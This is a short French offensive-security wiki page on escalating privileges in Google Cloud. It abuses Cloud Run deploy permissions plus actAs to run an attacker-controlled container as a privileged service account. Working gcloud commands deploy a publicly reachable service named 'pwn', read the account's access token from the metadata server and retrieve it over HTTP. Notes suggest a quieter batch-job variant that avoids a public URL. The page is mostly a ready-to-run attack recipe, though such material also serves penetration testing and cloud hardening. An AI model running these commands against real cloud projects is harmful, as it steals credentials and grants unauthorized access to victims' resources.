---
title: "Cloud Run : exécuter un conteneur en tant que compte de service attaché"
description: "Déployer un service ou une tâche Cloud Run avec run.services.create plus actAs, exécutant des conteneurs de l'attaquant en tant que compte de service attaché."
keywords:
  - Cloud Run
  - run.services.create
  - actAs
  - compte de service
  - déploiement de conteneur
  - tâche
---

# Cloud Run

Avec `run.services.create` (ou `run.jobs.create`) et `actAs` sur un compte de service, vous déployez un conteneur qui s'exécute en tant que ce compte. Pointez-le vers une image que vous contrôlez et lisez le jeton depuis le serveur de métadonnées à l'intérieur du conteneur.

## Déployer un service en tant que compte privilégié

```bash
gcloud run deploy pwn --image=gcr.io/<your-project>/leak --region=<region> \
  --service-account=<privileged-sa>@<project>.iam.gserviceaccount.com --allow-unauthenticated
# the container fetches the token:
# curl -H "Metadata-Flavor: Google" \
#   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl "$(gcloud run services describe pwn --region=<region> --format='value(status.url)')"
```

Une **tâche** Cloud Run est l'équivalent batch plus discret (`gcloud run jobs create ... --execute-now`) lorsque vous ne voulez pas d'URL publique.

## Notes d'exploitation

- L'image peut résider dans votre propre projet si le compte de déploiement peut la récupérer ; sinon, poussez-la vers un dépôt que le projet cible peut lire.
- `--service-account` exerce `actAs` ; omettez-le et le service s'exécute en tant que compte Compute par défaut.
- Les Cloud Functions Gen2 sont des services Cloud Run, les deux chemins convergent donc.

## Outils

- **gcloud** (`run deploy`, `run jobs create`, `run services describe`) : déployer et atteindre le service.

## Références

- [Rhino Security Labs : escalade de privilèges GCP (partie 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud : GCP](https://hackingthe.cloud/)
- [Google : identité de service Cloud Run](https://cloud.google.com/run/docs/securing/service-identity)
